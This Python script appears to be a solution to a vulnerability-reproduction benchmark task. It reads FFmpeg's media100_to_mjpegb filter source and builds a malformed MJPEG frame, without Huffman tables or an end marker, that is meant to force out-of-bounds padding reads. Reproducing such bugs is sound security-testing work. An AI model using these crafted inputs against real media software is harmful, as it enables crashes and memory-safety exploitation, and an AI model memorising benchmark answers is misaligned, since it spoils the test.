import os
import re
import struct
import tarfile
from typing import Optional


def _read_text_from_tar(tar_path: str, target_endswith: str) -> Optional[str]:
    try:
        with tarfile.open(tar_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                name = m.name.replace("\\", "/")
                if name.endswith(target_endswith):
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read()
                    try:
                        return data.decode("utf-8", "replace")
                    except Exception:
                        return data.decode("latin1", "replace")
    except Exception:
        return None
    return None


def _read_text_from_dir(dir_path: str, target_filename: str) -> Optional[str]:
    for root, _, files in os.walk(dir_path):
        for fn in files:
            if fn == target_filename:
                p = os.path.join(root, fn)
                try:
                    with open(p, "rb") as f:
                        data = f.read()
                    try:
                        return data.decode("utf-8", "replace")
                    except Exception:
                        return data.decode("latin1", "replace")
                except Exception:
                    return None
    return None


def _find_media100_bsf_source(src_path: str) -> Optional[str]:
    if os.path.isdir(src_path):
        return _read_text_from_dir(src_path, "media100_to_mjpegb.c")
    if os.path.isfile(src_path):
        t = _read_text_from_tar(src_path, "media100_to_mjpegb.c")
        if t is not None:
            return t
    return None


def _be16(n: int) -> bytes:
    return bytes([(n >> 8) & 0xFF, n & 0xFF])


def _marker(m: int) -> bytes:
    return bytes([0xFF, m & 0xFF])


def _jpeg_segment(marker_byte: int, payload: bytes) -> bytes:
    return _marker(marker_byte) + _be16(len(payload) + 2) + payload


def _build_minimal_mjpeg_no_dht(width: int = 16, height: int = 16, scan_bytes: bytes = b"\x00") -> bytes:
    if width < 1:
        width = 1
    if height < 1:
        height = 1
    if not scan_bytes:
        scan_bytes = b"\x00"

    soi = b"\xFF\xD8"

    # APP0 with "AVI1" (common for MJPEG variants)
    app0 = _jpeg_segment(0xE0, b"AVI1")

    # One quantization table (id 0), 8-bit precision
    dqt_tbl = bytes([0x00]) + (b"\x01" * 64)
    dqt = _jpeg_segment(0xDB, dqt_tbl)

    # Baseline SOF0: 8-bit, 3 components, all 1x1 sampling, all use quant table 0
    sof0_payload = (
        bytes([0x08]) +
        _be16(height) +
        _be16(width) +
        bytes([0x03]) +
        bytes([0x01, 0x11, 0x00]) +
        bytes([0x02, 0x11, 0x00]) +
        bytes([0x03, 0x11, 0x00])
    )
    sof0 = _jpeg_segment(0xC0, sof0_payload)

    # SOS: 3 components; luma uses (DC/AC)=0, chroma uses (DC/AC)=1
    sos_payload = (
        bytes([0x03]) +
        bytes([0x01, 0x00]) +
        bytes([0x02, 0x11]) +
        bytes([0x03, 0x11]) +
        bytes([0x00, 0x3F, 0x00])
    )
    sos = _jpeg_segment(0xDA, sos_payload)

    # No DHT and no EOI; end right after entropy data to force padding reads.
    return soi + app0 + dqt + sof0 + sos + scan_bytes


def _detect_header_requirements(c_text: Optional[str]) -> tuple[int, str, Optional[bytes]]:
    # Returns (skip_bytes, endian_for_len, magic4_or_None)
    if not c_text:
        return 0, "le", None

    # If it sets a pointer to pkt->data + 4 and uses pkt->size - 4, likely 4-byte header
    has_ptr_skip4 = re.search(r"=\s*pkt->data\s*\+\s*4\s*;", c_text) is not None
    has_size_minus4 = re.search(r"pkt->size\s*-\s*4", c_text) is not None
    skip = 4 if (has_ptr_skip4 or has_size_minus4) else 0

    # Determine endian usage for potential length field
    endian = "le"
    if re.search(r"AV_RB32\s*\(\s*pkt->data\s*\)", c_text):
        endian = "be"
    elif re.search(r"AV_RL32\s*\(\s*pkt->data\s*\)", c_text):
        endian = "le"

    # Look for a 4-byte ASCII tag used as magic (best-effort)
    magic = None
    for tag in ("M100", "MJPG", "mjpg", "MJPB", "MJPA", "MJPB", "m100"):
        if f'"{tag}"' in c_text or f"'{tag}'" in c_text:
            try:
                magic = tag.encode("ascii")[:4].ljust(4, b"\x00")
                break
            except Exception:
                pass

    return skip, endian, magic


class Solution:
    def solve(self, src_path: str) -> bytes:
        c_text = _find_media100_bsf_source(src_path)
        skip, endian, magic4 = _detect_header_requirements(c_text)

        jpeg = _build_minimal_mjpeg_no_dht(width=16, height=16, scan_bytes=b"\x00")

        if skip == 0:
            return jpeg

        if magic4 is not None and len(magic4) == 4:
            hdr = magic4
        else:
            # Commonly a size field; use jpeg payload size.
            if endian == "be":
                hdr = struct.pack(">I", len(jpeg))
            else:
                hdr = struct.pack("<I", len(jpeg))

        return hdr + jpeg